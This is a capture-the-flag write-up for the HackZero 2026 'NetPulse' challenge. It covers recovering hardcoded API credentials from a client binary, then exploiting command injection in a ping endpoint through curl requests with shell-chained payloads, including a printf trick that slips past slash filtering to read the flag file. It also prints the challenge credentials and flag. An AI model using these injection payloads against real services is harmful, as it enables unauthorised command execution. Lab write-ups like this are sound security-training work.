# NetPulse

| Field      | Value |
|------------|-------|
| Category   | Misc |
| Points     | 500 |
| Solves     | 25 |

## Description

NetPulse is a modern network monitoring thick client built with a proper 3-tier setup. Everything looks clean: client, backend, and the web layer doing the heavy lifting.

It does what it’s supposed to. Mostly.

But like any real-world tool, some features behave a little differently when pushed off the happy path.
Figure out how it really works.

Flag format: HackZero{}

***Note: Windows may flag the executable as malware, so either run it by disabling defender or in a Virtual Machine***

## Files

- [NelPulse.exe](./NelPulse.exe)
- [NetPulse](./NetPulse)

## Writeup

> ```Flag:```  `HackZero{c5ce165f3393bd0bfafab77bd8ac8569}`

## Challenge Information
- **CTF Name:** HackZero 2026
- **Challenge Name:** NetPulse
- **Category:** Misc
- **Points:** 500
- **Author:** @pphreak_1001
- **Solved By:** ret2.libc


I really liked this challenge. Big respect to the authors.
It looked like a clean network tool, but the real bug was in how the backend handled user input when not in the “happy path”.

## 1. Challenge Goal

I got these files:

- NelPulse.exe
- NetPulse
- Flag format given: `HackZero{...}`


## 1. Initial Recon

First I checked what each file actually is.

```sh
file NetPulse NelPulse.exe
xxd -l 16 NetPulse
xxd -l 16 NelPulse.exe
```

What I got:

- `NetPulse` starts with `7f 45 4c 46` → ELF i.e., which means Linux binary
- `NelPulse.exe` starts with `4d 5a` → PE i.e., which means Windows executable

So this is a packaged cross-platform app style challenge.

## 2. Static Analysis (Strings Hunt)

I started hunting for URLs, auth keywords, debug artifacts.

```sh
strings -n 5 NelPulse.exe | grep -Ei "api|login|token|bearer|pphreak|netpulse|debug|user|pass|auth"
```

From string mining, I got key hints:

- API usage (`Bearer`, `/login`, `/tools/...`)
- domain reference with `pphreak1001`
- module names like `core.api`, `core.auth`, `core.tools`
- debug-looking credential values inside login UI code path

Important values recovered:

- API base URL: `https://network.pphreak1001.tech/api`
- Username: `n3tw0rk_op3r4tor`
- Password: `d14gnos1s3xp3rtahahahaha@@!`

This was a great design choice by authors: creds hidden in packaged client internals.

## 3. API Login

I tested login endpoint with form encoding.

```sh
curl -s -X POST "https://network.pphreak1001.tech/api/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=n3tw0rk_op3r4tor&password=d14gnos1s3xp3rtahahahaha@@!" | jq
```

Response returned:

```text
access_token
token_type: bearer
```

JWT i.e., which means JSON Web Token used for authenticated API calls.

## 4. Endpoint Mapping

Then I tested visible tool endpoints:

- `/api/tools/ping`
- `/api/tools/nslookup`
- `/api/tools/ipinfo`
- `/api/tools/speedtest`

Normal ping request:

```sh
TOKEN='<paste_token_here>'

curl -s -X POST "https://network.pphreak1001.tech/api/tools/ping" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target":"8.8.8.8"}' | jq
```

This worked fine.

## 5. Vulnerability Discovery (Command Injection)

I suspected command injection in ping tool, so I tested payload chaining.

```sh
curl -s -X POST "https://network.pphreak1001.tech/api/tools/ping" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target":"8.8.8.8; id"}' | jq -r '.result'
```

I got `uid=...` output from server process.
So this confirmed command injection (RCE) in ping endpoint.

RCE i.e., which means remote code execution.

## 6. Read Backend Code Through Injection (POC Stage 2)

To fully confirm root cause, I used injection to print backend source:

```sh
curl -s -X POST "https://network.pphreak1001.tech/api/tools/ping" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target":"8.8.8.8; sed -n "1,220p" /app/main.py; sed -n "1,260p" /app/tools.py"}' | jq -r '.result'
```

From code behavior:

- ping command was created using user-controlled target
- command executed via shell subprocess
- weak validation existed but was bypassable
- target normalization split on `://` and `/`, but did not prevent shell metacharacters

This is the exact bug...

## 7. Getting the Flag

I found `/flag.txt` existed, but direct `/flag.txt` could get broken due to slash-based target splitting.
So I bypassed slash handling by generating `/` at runtime with `printf`.

Final Flag Read POC

```sh
curl -s -X POST "https://network.pphreak1001.tech/api/tools/ping" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target":"8.8.8.8; s=$(printf '\''\057'\''); cat ${s}flag.txt"}' | jq -r '.result'
```

This returned:

```text
HackZero{c5ce165f3393bd0bfafab77bd8ac8569}
```

## 8. Final Flag

`HackZero{c5ce165f3393bd0bfafab77bd8ac8569}`

## Analysis

- Static string extraction from packaged client
- Recover hidden API URL + credentials
- Login and get JWT bearer token
- Send injection payload to `/api/tools/ping`
- Confirm command execution
- Bypass weak slash handling
- Read `/flag.txt`

## 12. Why This Challenge Was Good

I liked this challenge because it tested multiple real-world skills together:

- client-side reverse engineering
- auth flow understanding
- API protocol correctness (form vs JSON)
- command injection exploitation
- bypassing weak sanitization logic

Very realistic, very fun.

## Author

ret2.libc
